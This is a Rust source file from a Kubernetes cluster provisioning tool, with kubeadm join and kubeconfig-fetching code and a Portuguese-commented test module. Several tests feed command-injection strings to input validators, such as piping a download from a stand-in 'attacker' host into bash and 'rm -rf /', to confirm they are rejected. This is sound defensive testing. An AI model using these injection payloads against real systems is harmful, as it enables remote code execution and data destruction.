fn parse_join_info(output: &str) -> Result<JoinInfo> {
    let token =
        extract_after(output, "--token ").ok_or_else(|| Error::Invalid("não consegui extrair --token do output do kubeadm init".into()))?;
    let ca_cert_hash = extract_after(output, "--discovery-token-ca-cert-hash ")
        .ok_or_else(|| Error::Invalid("não consegui extrair --discovery-token-ca-cert-hash do output do kubeadm init".into()))?;
    let certificate_key = extract_after(output, "--certificate-key ");
    Ok(JoinInfo { token, ca_cert_hash, certificate_key })
}

fn extract_after(text: &str, marker: &str) -> Option<String> {
    let idx = text.find(marker)?;
    let rest = &text[idx + marker.len()..];
    let value = rest.split_whitespace().next()?;
    Some(value.trim_end_matches('\\').to_string())
}

fn kubeadm_join(target: &SshTarget, label: &str, endpoint: &str, info: &JoinInfo, as_control_plane: bool) -> Result<()> {
    if remote::ssh_check(target, "test -f /etc/kubernetes/kubelet.conf") {
        println!("[{label}] kubeadm join: já satisfeito (SKIP)");
        return Ok(());
    }
    let mut cmd = format!("kubeadm join {endpoint}:6443 --token {} --discovery-token-ca-cert-hash {}", info.token, info.ca_cert_hash);
    if as_control_plane {
        let key = info
            .certificate_key
            .as_ref()
            .ok_or_else(|| Error::Invalid(format!("[{label}] sem certificate-key disponível para join de control-plane")))?;
        cmd.push_str(&format!(" --control-plane --certificate-key {key}"));
    }
    println!("[{label}] kubeadm join: a correr...");
    remote::ssh_run(target, &cmd)?;
    println!("[{label}] kubeadm join: OK");
    Ok(())
}

fn fetch_kubeconfig(cp1: &SshTarget, cluster_name: &str) -> Result<()> {
    let dir = state_root().join("clusters");
    std::fs::create_dir_all(&dir)?;
    let dest = dir.join(format!("{cluster_name}-kubeconfig.yaml"));

    // `/etc/kubernetes/admin.conf` é 0600 root:root — copia para /tmp com
    // permissão legível pelo utilizador SSH antes do scp, depois limpa.
    remote::ssh_run(cp1, "cp /etc/kubernetes/admin.conf /tmp/delonix-admin.conf && chmod 644 /tmp/delonix-admin.conf")?;
    remote::scp_from(cp1, "/tmp/delonix-admin.conf", &dest)?;
    let _ = remote::ssh_run(cp1, "rm -f /tmp/delonix-admin.conf");

    println!("kubeconfig: {}", dest.display());
    println!("export KUBECONFIG={}", dest.display());

    if let Some(home) = std::env::var_os("HOME") {
        let kube_dir = PathBuf::from(home).join(".kube");
        let kube_config = kube_dir.join("config");
        if !kube_config.exists() {
            std::fs::create_dir_all(&kube_dir)?;
            std::fs::copy(&dest, &kube_config)?;
            println!("também copiado para {} (não existia ainda)", kube_config.display());
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn vm_names_gera_nomes_deterministicos() {
        assert_eq!(vm_names("prod", "cp", 2), vec!["prod-cp1", "prod-cp2"]);
        assert_eq!(vm_names("prod", "w", 3), vec!["prod-w1", "prod-w2", "prod-w3"]);
        assert_eq!(vm_names("prod", "cp", 0), Vec::<String>::new());
    }

    #[test]
    fn resolve_vm_image_usa_a_explicita_sem_tocar_no_store() {
        let tmp = std::env::temp_dir().join(format!("delonix-cluster-resolve-image-test-{}", std::process::id()));
        let store = VmImageStore::open(&tmp).unwrap();
        assert_eq!(resolve_vm_image(&store, Some("minha-tag".to_string())).unwrap(), "minha-tag");
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn resolve_vm_image_falha_claro_sem_imagens_locais() {
        let tmp = std::env::temp_dir().join(format!("delonix-cluster-resolve-image-empty-{}", std::process::id()));
        let store = VmImageStore::open(&tmp).unwrap();
        let err = resolve_vm_image(&store, None).unwrap_err();
        assert!(format!("{err}").contains("build"));
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn resolve_vm_image_usa_a_unica_existente() {
        let tmp = std::env::temp_dir().join(format!("delonix-cluster-resolve-image-one-{}", std::process::id()));
        let store = VmImageStore::open(&tmp).unwrap();
        store
            .save(&vmimage::VmImage {
                name: "ubuntu-26.04-k8s".to_string(),
                tag: "ubuntu-26.04-k8s".to_string(),
                digest: "sha256:abc".to_string(),
                size: 1,
                ubuntu_release: Some("26.04".to_string()),
                k8s_version: Some("1.31".to_string()),
                created_unix: 0,
            })
            .unwrap();
        assert_eq!(resolve_vm_image(&store, None).unwrap(), "ubuntu-26.04-k8s");
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn resolve_vm_image_falha_claro_com_multiplas_imagens() {
        let tmp = std::env::temp_dir().join(format!("delonix-cluster-resolve-image-many-{}", std::process::id()));
        let store = VmImageStore::open(&tmp).unwrap();
        for tag in ["a", "b"] {
            store
                .save(&vmimage::VmImage {
                    name: tag.to_string(),
                    tag: tag.to_string(),
                    digest: "sha256:abc".to_string(),
                    size: 1,
                    ubuntu_release: None,
                    k8s_version: None,
                    created_unix: 0,
                })
                .unwrap();
        }
        let err = resolve_vm_image(&store, None).unwrap_err();
        assert!(format!("{err}").contains("--vm-image"));
        let _ = std::fs::remove_dir_all(&tmp);
    }

    const SAMPLE_KUBEADM_INIT_OUTPUT: &str = "\
Your Kubernetes control-plane has initialized successfully!

To start using your cluster, you need to run the following as a regular user:

  mkdir -p $HOME/.kube
  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
  sudo chown $(id -u):$(id -g) $HOME/.kube/config

You can now join any number of the control-plane node running the following command on each as root:

  kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
	--discovery-token-ca-cert-hash sha256:1111111111111111111111111111111111111111111111111111111111111111 \\
	--control-plane --certificate-key 2222222222222222222222222222222222222222222222222222222222222222

Please note that the certificate-key gives access to cluster sensitive data, keep it secret!
As a safeguard, uploaded-certs will be deleted in two hours; If necessary, you can use
\"kubeadm init phase upload-certs --upload-certs\" to reload certs afterward.

Then you can join any number of worker nodes by running the following on each as root:

kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
	--discovery-token-ca-cert-hash sha256:1111111111111111111111111111111111111111111111111111111111111111
";

    #[test]
    fn valid_endpoint_aceita_host_ip_e_porta() {
        assert!(valid_endpoint("10.0.0.10"));
        assert!(valid_endpoint("10.0.0.10:6443"));
        assert!(valid_endpoint("lb.exemplo.com"));
        assert!(valid_endpoint("cp1"));
    }

    #[test]
    fn valid_endpoint_recusa_injeccao_de_comandos() {
        assert!(!valid_endpoint("10.0.0.10; curl http://attacker/pwn.sh | bash; #"));
        assert!(!valid_endpoint("$(curl http://attacker/pwn.sh)"));
        assert!(!valid_endpoint("`whoami`"));
        assert!(!valid_endpoint("10.0.0.10 && rm -rf /"));
        assert!(!valid_endpoint(""));
        assert!(!valid_endpoint("-oProxyCommand=x"));
    }

    #[test]
    fn valid_cidr_aceita_formato_normal_e_recusa_injeccao() {
        assert!(valid_cidr("10.244.0.0/16"));
        assert!(!valid_cidr("10.244.0.0/16; rm -rf /"));
        assert!(!valid_cidr(""));
    }

    #[test]
    fn valid_version_aceita_formato_normal_e_recusa_injeccao() {
        assert!(valid_version("1.31"));
        assert!(valid_version("1.31.2"));
        assert!(!valid_version("1.31; curl evil|bash; #"));
        assert!(!valid_version("1.31\ncurl evil|bash\n#"));
        assert!(!valid_version(""));
    }

    /// Um `ClusterSpec` mínimo e VÁLIDO no `mode: ssh` (1 control-plane), para
    /// cada teste de `validate` só ter de sobrepor o campo que está a exercitar.
    fn spec_ssh_1cp() -> ClusterSpec {
        ClusterSpec {
            mode: "ssh".into(),
            control_plane: NodesSpec {
                replicas: None,
                hosts: vec![HostSpec { ip: "10.0.0.1".into(), hostname: None }],
            },
            ..Default::default()
        }
    }

    #[test]
    fn validate_recusa_endpoint_malicioso_no_manifesto_completo() {
        let spec = ClusterSpec {
            control_plane_endpoint: Some("10.0.0.10; curl http://attacker/pwn.sh | bash; #".into()),
            ..spec_ssh_1cp()
        };
        let err = validate(&spec).unwrap_err();
        assert!(format!("{err}").contains("controlPlaneEndpoint"));
    }

    #[test]
    fn validate_recusa_k8s_version_maliciosa() {
        let spec = ClusterSpec { k8s_version: Some("1.31; curl evil|bash #".into()), ..spec_ssh_1cp() };
        let err = validate(&spec).unwrap_err();
        assert!(format!("{err}").contains("k8sVersion"));
    }

    #[test]
    fn parse_join_info_extrai_token_hash_e_certificate_key() {
        let info = parse_join_info(SAMPLE_KUBEADM_INIT_OUTPUT).unwrap();
        assert_eq!(info.token, "abcdef.0123456789abcdef");
        assert_eq!(info.ca_cert_hash, "sha256:1111111111111111111111111111111111111111111111111111111111111111");
        assert_eq!(info.certificate_key.as_deref(), Some("2222222222222222222222222222222222222222222222222222222222222222"));
    }

    #[test]
    fn validate_recusa_etcd_external() {
        let spec = ClusterSpec { etcd: EtcdSpec { mode: "external".into() }, ..spec_ssh_1cp() };
        let err = validate(&spec).unwrap_err();
        assert!(format!("{err}").contains("etcd"));
    }

    #[test]
    fn validate_exige_endpoint_com_multiplos_control_planes() {
        let spec = ClusterSpec {
            control_plane: NodesSpec {
                replicas: None,
                hosts: vec![
                    HostSpec { ip: "10.0.0.1".into(), hostname: None },
                    HostSpec { ip: "10.0.0.2".into(), hostname: None },
                ],
            },
            ..spec_ssh_1cp()
        };
        let err = validate(&spec).unwrap_err();
        assert!(format!("{err}").contains("controlPlaneEndpoint"));
    }

    #[test]
    fn validate_aceita_1_control_plane_sem_endpoint() {
        assert!(validate(&spec_ssh_1cp()).is_ok());
    }

    #[test]
    fn validate_recusa_control_plane_vazio() {
        let spec = ClusterSpec { control_plane: NodesSpec::default(), ..spec_ssh_1cp() };
        assert!(validate(&spec).is_err());
    }

    #[test]
    fn cluster_spec_desserializa_de_yaml_completo() {
        let yaml = "\
mode: ssh
ssh: { user: delonix, key: /home/delonix/.ssh/id_ed25519 }
etcd: { mode: stacked }
controlPlaneEndpoint: lb.exemplo.com
controlPlane:
  hosts:
    - { ip: 10.0.0.10, hostname: cp1 }
    - { ip: 10.0.0.11, hostname: cp2 }
workers:
  hosts:
    - { ip: 10.0.0.20, hostname: w1 }
k8sVersion: \"1.31\"
";
        let spec: ClusterSpec = serde_yaml::from_str(yaml).unwrap();
        assert_eq!(spec.control_plane.hosts.len(), 2);
        assert_eq!(spec.workers.hosts.len(), 1);
        assert_eq!(spec.control_plane_endpoint.as_deref(), Some("lb.exemplo.com"));
        assert_eq!(spec.pod_subnet, default_pod_subnet());
    }

    /// O `Default` manual de `ClusterSpec` tem de ser indistinguível de um
    /// manifesto vazio — se divergir, os testes acima passam a exercitar um
    /// spec que o parser nunca produziria.
    #[test]
    fn cluster_spec_default_igual_ao_yaml_vazio() {
        let spec: ClusterSpec = serde_yaml::from_str("{}").unwrap();
        let def = ClusterSpec::default();
        assert_eq!(spec.mode, def.mode);
        assert_eq!(spec.ssh.user, def.ssh.user);
        assert_eq!(spec.etcd.mode, def.etcd.mode);
        assert_eq!(spec.pod_subnet, def.pod_subnet);
        assert_eq!(spec.service_subnet, def.service_subnet);
        assert_eq!(spec.cni, def.cni);
        assert_eq!(spec.kind.image, def.kind.image);
    }

    /// Um manifesto SEM bloco `ssh:` tem de ficar com o utilizador canónico
    /// (`delonix`), não com a string vazia — regressão do `Default` derivado.
    #[test]
    fn ssh_user_cai_no_default_quando_o_bloco_ssh_e_omitido() {
        let spec: ClusterSpec = serde_yaml::from_str("mode: ssh").unwrap();
        assert_eq!(spec.ssh.user, "delonix");
    }
}

/// Trata o `init` deste grupo (ver `cmd::scaffold`).
fn cmd_init(target: super::scaffold::Target, dir: PathBuf, name: Option<String>, image: Option<String>, force: bool) -> Result<()> {
    let name = name.unwrap_or_else(|| {
        // Sem `--name`, usa o nome do DIRECTÓRIO. Não se pode usar `canonicalize`:
        // o directório ainda não existe (é o `init` que o cria) e falharia sempre,
        // caindo no fallback — todos os projectos ficavam chamados "app".
        // `.`/vazio resolvem para o cwd; um caminho novo usa o seu basename.
        let p = if dir.as_os_str().is_empty() || dir == std::path::Path::new(".") {
            std::env::current_dir().ok()
        } else {
            Some(dir.clone())
        };
        p.as_deref()
            .and_then(|p| p.file_name())
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_else(|| "app".to_string())
    });
    super::scaffold::init(target, &super::scaffold::InitOpts { dir, name, image, force, template: None, up: false })
}
